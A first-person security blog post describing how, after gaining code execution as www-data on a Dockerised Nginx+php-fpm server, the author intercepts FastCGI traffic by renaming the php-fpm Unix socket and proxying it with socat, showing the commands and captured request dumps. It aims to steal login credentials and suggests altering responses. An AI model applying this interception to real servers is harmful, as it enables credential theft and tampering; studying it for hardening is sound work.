# Rootless Sniffing

Once upon a time, a noob found an RCE on a server but didn't got root, the noob wanted to sniff the requests that were arriving on that server, to escalate privileges, but didn't know how. That noob is me , and this is my story.

# Scenario 

Okay, ignore the bullshit intro.
I had access to the `www-data` user, and the server was running `Nginx+php-fpm`, how could I sniff the requests without rooting it to run `tcpdump`? The `Nginx` and `php-fpm` master processes run as `root`, but the workers run on `www-data`. Oh, and it was a docker alpine instance, fack.

# Ideias

## Dumping the memory
The first idea that came to mind was to just dump the memory of the Nginx/php-fpm workers via the `/proc/PID/mem` and hope that the requests are there. Here is a nice thread about it [unix.stackexchange.com/questions/6301/how-do-i-read-from-proc-pid-mem-under-linux](https://unix.stackexchange.com/questions/6301/how-do-i-read-from-proc-pid-mem-under-linux) got most of the info there.

The problem that I ran into was that most tools/scripts uses the `ptrace` syscall to attach  to the process before dumping it, and you can't `ptrace` at all on Docker on kernels older than 4.8 without a specific config `--cap-add=SYS_PTRACE` or on `docker-compose.yml` :

```
cap_add:
    - SYS_PTRACE
```

More deep analysis of this on https://jvns.ca/blog/2020/04/29/why-strace-doesnt-work-in-docker/.

On Docker running kernels after 4.8 you can use the `process_vm_readv` syscall to dump the memory without attaching to it, but you still can't dump the memory of any process under your user. If the `/proc/sys/kernel/yama/ptrace_scope` is set to `1` it will only allow `ptrace`/`process_vm_readv` if your proccess is the father of the process you want to `ptrace`, if it's set to zero you can dump the memory, but it's `1` by default on most systems. More info on `Yama` on general : https://www.kernel.org/doc/Documentation/security/Yama.txt

Basically I can only dump the memory of a process  that I executed, not of any process running on my user. The workers are executed by the masters process that run under root :'( I also can't just spawn a new worker from `www-data` because the master process will ignore it.

## Logs
Editing `Nginx` config to add some logs? No `root` , no way :(

## File Descriptors
The idea here was that to each request the Nginx worker was going to open a new file descriptor to that socket, and I could dump his contents, if I'm quick, via `/proc/PID/fd/N`. It's a nice idea, but you can't interact with sockets/pipes by just using the file `/proc/PID/fd/N`.

There is one way that I found to achieve this: copying all the file descriptors using the fairly new syscall `pidfd_getfd`, this was introduced on kernel 5.6, with the `pidfd_open` syscall you can open a new file descriptor that refers to another process, with that you can use `pidfd_getfd` to copy all file descriptors and use them. Now for the sad part: `pidfd_getfd` permissions are governed by `ptrace` (T_T) So this falls in the same problem as dumping the memory.  
 
## Unix domain socket
Reading through the config file of `php-fpm` I found out that it used a [Unix domain socket]( https://en.wikipedia.org/wiki/Unix_domain_socket ) to communicate with Nginx using [Fastcgi]( https://en.wikipedia.org/wiki/FastCGI ) , what a horrible name btw.

`/usr/local/etc/php-fpm.d/www.conf`
```
[...]
; The address on which to accept FastCGI requests.
; Valid syntaxes are:
;   'ip.add.re.ss:port'    - to listen on a TCP socket to a specific IPv4 address on
;                            a specific port;
;   '[ip:6:addr:ess]:port' - to listen on a TCP socket to a specific IPv6 address on
;                            a specific port;
;   'port'                 - to listen on a TCP socket to all addresses
;                            (IPv6 and IPv4-mapped) on a specific port;
;   '/path/to/unix/socket' - to listen on a unix socket.
; Note: This value is mandatory.
listen = /tmp/.php-fpm.sock
[...]
```

So I began to search for ways of sniffing the Unix domain socket, and turns out it's pretty hard to properly sniff it, mainly because it isn't bound to any protocol, and most reliable ways use `ptrace`, but a dirty hack it's to just rename the socket, everything's a file on unix yadayada, and create a new one that MiTM it , like this [superuser.com/a/576404](https://superuser.com/a/576404), using `socat`. Note that this only works if you can write on the socket's directory, I'm still not sure if this is the default when using a supervisor, or it's a misconfig putting the socket on `/tmp`, but surely it isn't that uncommon.
So here's the PoC :

```
/tmp $ id
uid=82(www-data) gid=82(www-data) groups=82(www-data),82(www-data)
/tmp $ mv .php-fpm.sock .php-fpm.sock.1
/tmp $ ./socat -t100 -x -v UNIX-LISTEN:/tmp/.php-fpm.sock,mode=777,reuseaddr,fork UNIX-
CONNECT:/tmp/.php-fpm.sock.1
> 2021/03/25 08:47:56.069495  length=816 from=0 to=815
 01 01 00 01 00 08 00 00 00 01 00 00 00 00 00 00  ................
 01 04 00 01 03 06 02 00 0f 15 53 43 52 49 50 54  ..........SCRIPT
 5f 46 49 4c 45 4e 41 4d 45 2f 61 70 69 2f 70 75  _FILENAME/api/pu
 62 6c 69 63 2f 69 6e 64 65 78 2e 70 68 70 0c 07  blic/index.php..
 51 55 45 52 59 5f 53 54 52 49 4e 47 71 3d 2f 68  QUERY_STRINGq=/h
 65 79 26 0e 03 52 45 51 55 45 53 54 5f 4d 45 54  ey&..REQUEST_MET
 48 4f 44 47 45 54 0c 00 43 4f 4e 54 45 4e 54 5f  HODGET..CONTENT_
 54 59 50 45 0e 00 43 4f 4e 54 45 4e 54 5f 4c 45  TYPE..CONTENT_LE
 4e 47 54 48 0b 0a                                NGTH..
 53 43 52 49 50 54 5f 4e 41 4d 45 2f 69 6e 64 65  SCRIPT_NAME/inde
 78 2e 70 68 70 0b 04 52 45 51 55 45 53 54 5f 55  x.php..REQUEST_U
 52 49 2f 68 65 79 0c 0a                          RI/hey..
 44 4f 43 55 4d 45 4e 54 5f 55 52 49 2f 69 6e 64  DOCUMENT_URI/ind
 65 78 2e 70 68 70 0d 0b 44 4f 43 55 4d 45 4e 54  ex.php..DOCUMENT
 5f 52 4f 4f 54 2f 61 70 69 2f 70 75 62 6c 69 63  _ROOT/api/public
 0f 08 53 45 52 56 45 52 5f 50 52 4f 54 4f 43 4f  ..SERVER_PROTOCO
 4c 48 54 54 50 2f 31 2e 31 0e 04 52 45 51 55 45  LHTTP/1.1..REQUE
 53 54 5f 53 43 48 45 4d 45 68 74 74 70 11 07 47  ST_SCHEMEhttp..G
 41 54 45 57 41 59 5f 49 4e 54 45 52 46 41 43 45  ATEWAY_INTERFACE
 43 47 49 2f 31 2e 31 0f 0c 53 45 52 56 45 52 5f  CGI/1.1..SERVER_
 53 4f 46 54 57 41 52 45 6e 67 69 6e 78 2f 31 2e  SOFTWAREnginx/1.
 31 38 2e 30 0b 0a                                18.0..
 52 45 4d 4f 54 45 5f 41 44 44 52 31 37 32 2e 31  REMOTE_ADDR172.1
 38 2e 30 2e 31 0b 05 52 45 4d 4f 54 45 5f 50 4f  8.0.1..REMOTE_PO
 52 54 35 37 35 38 30 0b 0a                       RT57580..
 53 45 52 56 45 52 5f 41 44 44 52 31 37 32 2e 31  SERVER_ADDR172.1
 38 2e 30 2e 32 0b 02 53 45 52 56 45 52 5f 50 4f  8.0.2..SERVER_PO
 52 54 38 30 0b 01 53 45 52 56 45 52 5f 4e 41 4d  RT80..SERVER_NAM
 45 5f 0f 03 52 45 44 49 52 45 43 54 5f 53 54 41  E_..REDIRECT_STA
 54 55 53 32 30 30 09 0e 48 54 54 50 5f 48 4f 53  TUS200..HTTP_HOS
 54 31 32 37 2e 30 2e 30 2e 31 3a 39 30 32 32 0f  T127.0.0.1:9022.
 52 48 54 54 50 5f 55 53 45 52 5f 41 47 45 4e 54  RHTTP_USER_AGENT
 4d 6f 7a 69 6c 6c 61 2f 35 2e 30 20 28 4d 61 63  Mozilla/5.0 (Mac
 69 6e 74 6f 73 68 3b 20 49 6e 74 65 6c 20 4d 61  intosh; Intel Ma
 63 20 4f 53 20 58 20 31 30 2e 31 34 3b 20 72 76  c OS X 10.14; rv
 3a 38 35 2e 30 29 20 47 65 63 6b 6f 2f 32 30 31  :85.0) Gecko/201
 30 30 31 30 31 20 46 69 72 65 66 6f 78 2f 38 35  00101 Firefox/85
 2e 30 0b 4a 48 54 54 50 5f 41 43 43 45 50 54 74  .0.JHTTP_ACCEPTt
 65 78 74 2f 68 74 6d 6c 2c 61 70 70 6c 69 63 61  ext/html,applica
 74 69 6f 6e 2f 78 68 74 6d 6c 2b 78 6d 6c 2c 61  tion/xhtml+xml,a
 70 70 6c 69 63 61 74 69 6f 6e 2f 78 6d 6c 3b 71  pplication/xml;q
 3d 30 2e 39 2c 69 6d 61 67 65 2f 77 65 62 70 2c  =0.9,image/webp,
 2a 2f 2a 3b 71 3d 30 2e 38 14 23 48 54 54 50 5f  */*;q=0.8.#HTTP_
 41 43 43 45 50 54 5f 4c 41 4e 47 55 41 47 45 70  ACCEPT_LANGUAGEp
 74 2d 42 52 2c 70 74 3b 71 3d 30 2e 38 2c 65 6e  t-BR,pt;q=0.8,en
 2d 55 53 3b 71 3d 30 2e 35 2c 65 6e 3b 71 3d 30  -US;q=0.5,en;q=0
 2e 33 14 0d 48 54 54 50 5f 41 43 43 45 50 54 5f  .3..HTTP_ACCEPT_
 45 4e 43 4f 44 49 4e 47 67 7a 69 70 2c 20 64 65  ENCODINGgzip, de
 66 6c 61 74 65 0f 0a                             flate..
 48 54 54 50 5f 43 4f 4e 4e 45 43 54 49 4f 4e 6b  HTTP_CONNECTIONk
 65 65 70 2d 61 6c 69 76 65 1e 01 48 54 54 50 5f  eep-alive..HTTP_
 55 50 47 52 41 44 45 5f 49 4e 53 45 43 55 52 45  UPGRADE_INSECURE
 5f 52 45 51 55 45 53 54 53 31 00 00 01 04 00 01  _REQUESTS1......
 00 00 00 00 01 05 00 01 00 00 00 00              ............
--
< 2021/03/25 08:47:56.098735  length=168 from=0 to=167
 01 07 00 01 00 16 02 00 50 72 69 6d 61 72 79 20  ........Primary
 73 63 72 69 70 74 20 75 6e 6b 6e 6f 77 6e 00 00  script unknown..
 01 06 00 01 00 6b 05 00 53 74 61 74 75 73 3a 20  .....k..Status:
 34 30 34 20 4e 6f 74 20 46 6f 75 6e 64 0d 0a     404 Not Found..
 58 2d 50 6f 77 65 72 65 64 2d 42 79 3a 20 50 48  X-Powered-By: PH
 50 2f 37 2e 34 2e 31 35 0d 0a                    P/7.4.15..
 43 6f 6e 74 65 6e 74 2d 74 79 70 65 3a 20 74 65  Content-type: te
 78 74 2f 68 74 6d 6c 3b 20 63 68 61 72 73 65 74  xt/html; charset
 3d 55 54 46 2d 38 0d 0a                          =UTF-8..
 0d 0a                                            ..
 46 69 6c 65 20 6e 6f 74 20 66 6f 75 6e 64 2e 0a  File not found..
 00 00 00 00 00 01 03 00 01 00 08 00 00 00 00 00  ................
 00 00 00 00 00                                   .....
--
```

Nice, the PoC worked locally and I was seeing the FastCGI requests, but this PoC had some problems.

1. Renaming the socket brought the server down.
2. If my spoofed socket crashed for some reason the server would also go down. 
3. I don't want to depend on `socat` as it's a red flag on any server and a pretty big binary.

So I made a script that automatizes this whole process, and makes sure that if anything goes wrong it will rename the old socket back so the server doesn't go offline.

<script src="https://gist-it.appspot.com/github/caioluders/rootless_sniffing/blob/main/dsm.c"></script>

Here are static-linked binaries for red teaming purposes on [github.com/caioluders/rootless_sniffing](https://github.com/caioluders/rootless_sniffing)

# Conclusions
It was really insightful to go this low on the unix kernel, I'm more of a web guy I guess, and helped a lot to better understand basic authorization flows on the linux kernel. Altho most of my ideas were shit and didn't work, having found that I can spoof the Unix domain socket that the Nginx uses internally is a new technique for me. This can be used on red teaming to escalate privileges, if you weren't able to root it, by getting plain text credentials on a login POST request for example. You can also do more than just sniffing the requests: you can alter the server's responses! Use your imagination, maybe I make a tool later to achieve that.

I don't know which frameworks uses a Unix domain socket in the same way as `Nginx+php-fpm`, but I guess that should exist more contexts that this works, please publish it if you find more scenarios. 

I hope that this is helpful for someone ^.^
